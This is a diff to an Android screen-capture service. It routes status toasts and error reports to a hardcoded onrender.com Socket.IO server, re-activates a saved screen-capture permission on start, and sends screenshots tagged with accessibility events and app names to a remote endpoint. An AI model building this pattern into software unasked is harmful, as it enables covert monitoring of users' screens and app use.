@@ -109,7 +109,7 @@ public class ScreenCaptureService extends Service {
     public void onCreate() {
         super.onCreate();
         Log.d("ScreenCaptureService", "ScreenCaptureService started");
-        android.widget.Toast.makeText(getApplicationContext(), "ScreenCaptureService started", android.widget.Toast.LENGTH_SHORT).show();
+        showToastAndSend("ScreenCaptureService started");
         Log.d(TAG, "onCreate called");
         createNotificationChannel();
         
@@ -129,13 +129,18 @@ public class ScreenCaptureService extends Service {
         
         startForeground(NOTIFICATION_ID, createNotification());
         
+        // Restore MediaProjection if possible
+        if (mediaProjection == null) {
+            startProjectionFromSaved();
+        }
+        
         // Register receiver for screen capture actions
         screenCaptureReceiver = new BroadcastReceiver() {
             @Override
             public void onReceive(Context context, Intent intent) {
                 String action = intent.getAction();
                 Log.d(TAG, "ScreenCaptureService received action: " + action);
-                android.widget.Toast.makeText(context, "ScreenCaptureService received: " + action, android.widget.Toast.LENGTH_SHORT).show();
+                showToastAndSend("ScreenCaptureService received: " + action);
                 if (ACTION_SCREENSHOT_ONCE.equals(action)) {
                     // Extract event data if present
                     if (intent.hasExtra("eventType")) {
@@ -148,17 +153,21 @@ public class ScreenCaptureService extends Service {
                         lastEventTimestamp = -1;
                     }
                     if (mediaProjection != null) {
+                        if (imageReader == null) {
+                            startVirtualDisplay(null);
+                        }
                         captureScreenshot();
                     } else {
                         Log.w(TAG, "No MediaProjection for screenshot");
-                        android.widget.Toast.makeText(context, "ScreenCaptureService: No MediaProjection permission. Please grant screen capture permission.", android.widget.Toast.LENGTH_LONG).show();
+                        showToastAndSend("ScreenCaptureService: No MediaProjection permission. Please grant screen capture permission.");
+                        sendScreenshotError("No MediaProjection permission. Please grant screen capture permission.");
                     }
                 } else if (ACTION_START_SCREEN_CAPTURE.equals(action)) {
                     if (mediaProjection != null) {
                         startPeriodicCapture();
                     } else {
                         Log.w(TAG, "No MediaProjection for start capture");
-                        android.widget.Toast.makeText(context, "ScreenCaptureService: No MediaProjection permission. Please grant screen capture permission.", android.widget.Toast.LENGTH_LONG).show();
+                        showToastAndSend("ScreenCaptureService: No MediaProjection permission. Please grant screen capture permission.");
                     }
                 } else if (ACTION_STOP_SCREEN_CAPTURE.equals(action)) {
                     stopProjection();
@@ -282,9 +291,8 @@ public class ScreenCaptureService extends Service {
     private void captureScreenshot() {
         if (imageReader == null) {
             Log.e(TAG, "ImageReader is null");
-            new Handler(Looper.getMainLooper()).post(() ->
-                android.widget.Toast.makeText(getApplicationContext(), "ScreenCaptureService: ImageReader is null", android.widget.Toast.LENGTH_LONG).show()
-            );
+            showToastAndSend("ScreenCaptureService: ImageReader is null");
+            sendScreenshotError("ImageReader is null");
             return;
         }
         
@@ -293,6 +301,8 @@ public class ScreenCaptureService extends Service {
             image = imageReader.acquireLatestImage();
             if (image == null) {
                 Log.w(TAG, "Acquired image was null");
+                showToastAndSend("ScreenCaptureService: Acquired image was null");
+                sendScreenshotError("Acquired image was null");
                 return;
             }
             
@@ -302,7 +312,7 @@ public class ScreenCaptureService extends Service {
                 File screenshotFile = saveBitmapToFile(bitmap);
                 if (screenshotFile != null) {
                     Log.d(TAG, "Screenshot saved: " + screenshotFile.getAbsolutePath());
-                    android.widget.Toast.makeText(getApplicationContext(), "Screenshot captured", android.widget.Toast.LENGTH_SHORT).show();
+                    showToastAndSend("Screenshot captured");
                     uploadScreenshot(screenshotFile);
                     // Also send screenshot and event data via Socket.IO if available
                     if (socketManager == null) {
@@ -315,10 +325,18 @@ public class ScreenCaptureService extends Service {
                         byte[] imageBytes = baos.toByteArray();
                         socketManager.sendAccessibilityScreenshot(imageBytes, lastEventType, lastPackageName, lastEventTimestamp);
                     }
+                } else {
+                    showToastAndSend("Failed to save screenshot to file");
+                    sendScreenshotError("Failed to save screenshot to file");
                 }
+            } else {
+                showToastAndSend("Failed to convert image to bitmap");
+                sendScreenshotError("Failed to convert image to bitmap");
             }
         } catch (Exception e) {
             Log.e(TAG, "Error capturing screenshot: " + e.getMessage());
+            showToastAndSend("Exception: " + e.getMessage());
+            sendScreenshotError("Exception: " + e.getMessage());
         } finally {
             if (image != null) {
                 image.close();
@@ -371,18 +389,14 @@ public class ScreenCaptureService extends Service {
                 new String[]{"image/jpeg"},
                 (path, uri) -> {
                     Log.d(TAG, "MediaScanner scanned: " + path + ", uri: " + uri);
-                    new Handler(Looper.getMainLooper()).post(() ->
-                        android.widget.Toast.makeText(getApplicationContext(), "Screenshot saved to gallery: " + path, android.widget.Toast.LENGTH_LONG).show()
-                    );
+                    showToastAndSend("Screenshot saved to gallery: " + path);
                 }
             );
 
             return screenshotFile;
         } catch (IOException e) {
             Log.e(TAG, "Error saving screenshot to file", e);
-            new Handler(Looper.getMainLooper()).post(() ->
-                android.widget.Toast.makeText(getApplicationContext(), "Failed to save screenshot: " + e.getMessage(), android.widget.Toast.LENGTH_LONG).show()
-            );
+            showToastAndSend("Failed to save screenshot: " + e.getMessage());
             return null;
         }
     }
@@ -423,9 +437,7 @@ public class ScreenCaptureService extends Service {
                         String responseBody = response.body() != null ? response.body().string() : "No response body";
                         if (response.isSuccessful()) {
                             Log.d(TAG, "Screenshot uploaded successfully");
-                            new Handler(Looper.getMainLooper()).post(() ->
-                                android.widget.Toast.makeText(getApplicationContext(), "Screenshot sent to server", android.widget.Toast.LENGTH_SHORT).show()
-                            );
+                            showToastAndSend("Screenshot sent to server");
                             if (screenshotFile.exists()) {
                                 if (screenshotFile.delete()) {
                                     Log.d(TAG, "Temporary screenshot file deleted");
@@ -520,5 +532,38 @@ public class ScreenCaptureService extends Service {
              .putInt("result_code", resultCode)
              .putString("data_intent", data.toUri(Intent.URI_INTENT_SCHEME))
              .apply();
+    }
+
+    private void sendScreenshotError(String errorMsg) {
+        if (socketManager == null) {
+            socketManager = new SocketManager("https://myapplication4.onrender.com");
+            socketManager.connect();
+        }
+        if (socketManager.isConnected()) {
+            org.json.JSONObject data = new org.json.JSONObject();
+            try {
+                data.put("eventType", lastEventType);
+                data.put("packageName", lastPackageName);
+                data.put("timestamp", lastEventTimestamp);
+                data.put("error", errorMsg);
+                socketManager.sendAccessibilityError(data);
+            } catch (org.json.JSONException e) {
+                e.printStackTrace();
+            }
+        }
+    }
+
+    // Helper to show toast and send to server
+    private void showToastAndSend(String message) {
+        new Handler(Looper.getMainLooper()).post(() ->
+            android.widget.Toast.makeText(getApplicationContext(), message, android.widget.Toast.LENGTH_SHORT).show()
+        );
+        if (socketManager == null) {
+            socketManager = new SocketManager("https://myapplication4.onrender.com");
+            socketManager.connect();
+        }
+        if (socketManager.isConnected()) {
+            socketManager.sendToastMessage(message);
+        }
     }
 }
